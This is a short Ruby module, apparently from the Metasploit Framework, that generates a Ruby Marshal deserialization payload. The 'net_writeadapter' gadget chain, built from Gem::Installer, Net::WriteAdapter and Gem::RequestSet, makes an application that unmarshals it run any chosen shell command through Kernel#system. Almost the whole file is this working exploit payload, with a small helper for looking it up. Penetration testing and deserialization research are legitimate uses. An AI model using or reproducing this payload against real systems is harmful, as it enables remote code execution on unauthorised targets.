# -*- coding: binary -*-

# Ruby deserialization Utility
module Msf
  module Util
    # Ruby deserialization class
    class RubyDeserialization
      # That could be in the future a list of payloads used to exploit the Ruby deserialization vulnerability.
      PAYLOADS = {
        # https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
        net_writeadapter: proc do |command|
          "\x04\b[\bc\x15Gem::SpecFetcherc\x13Gem::InstallerU:\x15Gem::Requirement" \
          "[\x06o:\x1CGem::Package::TarReader\x06:\b@ioo:\x14Net::BufferedIO\a;\ao:" \
          "#Gem::Package::TarReader::Entry\a:\n@readi\x00:\f@headerI#{Marshal.dump(Rex::Text.rand_text_alphanumeric(12..20))[2..-1]}" \
          "\x06:\x06ET:\x12@debug_outputo:\x16Net::WriteAdapter\a:\f@socketo:\x14" \
          "Gem::RequestSet\a:\n@setso;\x0E\a;\x0Fm\vKernel:\x0F@method_id:\vsystem:\r" \
          "@git_setI#{Marshal.dump(command)[2..-1]}\x06;\fT;\x12:\fresolve"
        end
      }

      def self.payload(payload_name, command = nil)

        raise ArgumentError, "#{payload_name} payload not found in payloads" unless payload_names.include? payload_name.to_sym

        PAYLOADS[payload_name.to_sym].call(command)
      end

      def self.payload_names
        PAYLOADS.keys
      end

    end
  end
end
